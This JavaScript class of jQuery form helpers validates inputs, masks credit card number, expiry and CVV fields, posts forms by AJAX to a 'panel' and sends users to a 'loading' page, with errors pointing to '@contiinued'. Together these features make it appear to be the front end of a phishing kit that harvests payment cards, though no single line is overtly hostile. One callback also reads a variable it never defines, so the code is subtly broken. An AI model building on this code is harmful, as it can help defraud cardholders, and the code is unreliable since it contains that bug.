class CNTD {
  /**
   * Check Form Functions
   * Ensures form is valid before proceeding
   */

  check_form_button_disable(fields) {
    $('#submit-btn').attr("disabled", true);

    $('input').keyup(function() {
      var valid = true;

      fields.forEach( (field) => {
        if ($(field).val().length == 0) valid = false
      });

      $('#submit-btn').attr("disabled", !valid);
    })
  }

  check_form_with_error_message(fields, error_selector) {
    var valid = true;

    fields.forEach( (field) => {
      if ($(field).val().length == 0) {
        $(error_selector).show();
        valid = false;
      }
    });

    return valid;
  }

  /**
   * Mask CC
   * Correctly masks CC fields
   */
  mask_cc_form() {
    $('#cardnumber').mask("0000 0000 0000 0000");
    $('#expirydate').mask("00/00");
    $('#cvv').mask("000");
  }

  /**
   * Submit Form
   * Simple syntax for repetitive AJAX commands
   */

   submit_form(url, callback) {
     $('#submit-btn').attr("disabled", true);

     $('#form').submit(function(e) {
       e.preventDefault();

       $.ajax({
         type: 'POST',
         url: url,
         data: $(this).serialize(),
         success: function(data) { callback(data); }
       })
     })
   }

   simple_request(type, req_url, data, callback) {
     $.ajax({
       type: type,
       url: req_url,
       data: data,
       success: function(data) {
         callback(data);
       }
     })
   }

   /**
    * Success Callback
    * Basic callback for most panel requests
    */
   success_callback(data, success_url) {
     var parsed_data = JSON.parse(data);

     if (parsed_data.status == 'success') {
       window.location = success_url;
     }
   }

   handle_form_response(data) {
     console.log(data);
     if (JSON.parse(data).status != 'true') { console.error("[-] An error occured while trying to submit this form. Contact @contiinued."); return; }

     window.location = urlroot + '/pages/?p=loading';
   }

   /**
    * Send to Loading Callback
    * Callback where loading.php should follow
    */
   send_to_loading_callback(data) {
     console.log(data);
     if (JSON.parse(data).status != 'true') { console.error("[-] An error occured while trying to submit this form. Contact @contiinued."); return; }

     if (parsed_data.status == 'success') {
       window.location =  urlroot + '/pages/?p=loading';
     }
   }

   /**
    * Return Valid Response
    * Returns response only when valid
    */
   return_valid_response(data) {
     var parsed_data = JSON.parse(data);

     if (parsed_data.status == 'success') {
       return parsed_data;
     }
   }

    // get_status(uniqueid) {
    //   const url = "database_setup/"
    //   this.submit_form("database_setup/routes/get_status.php", )
    // }
}
